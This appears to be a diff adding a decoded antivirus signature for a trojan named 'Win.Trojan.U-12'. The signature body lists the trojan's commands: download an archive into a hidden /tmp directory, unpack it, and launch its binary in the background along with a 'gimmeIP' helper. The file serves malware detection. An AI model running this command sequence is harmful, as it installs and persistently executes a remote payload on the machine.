@@ -1,0 +1,13 @@
+VIRUS NAME: Win.Trojan.U-12
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+
+
+cd /tmp/.aga01
+get Agnieszka.tgz
+bye
+tar xfvz Agnieszka.tgz
+touch /tmp/aga
+nohup ./Agnieszka &
+./gimmeIP
